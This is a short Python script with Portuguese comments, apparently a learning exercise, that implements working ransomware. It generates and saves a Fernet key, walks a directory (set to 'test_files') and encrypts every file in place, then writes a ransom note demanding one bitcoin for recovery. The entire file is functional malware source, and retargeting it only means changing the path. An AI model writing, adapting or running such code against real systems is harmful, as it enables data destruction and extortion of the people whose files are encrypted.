from cryptography.fernet import Fernet
import os

#1. Gerar uma chave de criptografia e salvar

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)


#2. Carregar a chave salva

def carregar_chave():
    return open("chave.key", "rb").read()


#3.Criptografar um único arquivo

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#4. Encontrar arquivos para criptografar

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith (".key"):
                lista.append(caminho)
    return lista

#5 Mensagem de resgate

def criar_mensagem_resgate():
    with open("LEIA ISSO.TXT", "w")as f:
        f.write("/nSeus arquivos foram criptografados!n")
        f.write("/nEnvia 1 bitcoin para o endereço X!\n")
        f.write("/nDepois disso, enviaremos a chave para a recuperação dos dados.\n")

#6 Execução Principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos criptografados!")

if __name__=="__main__":
    main()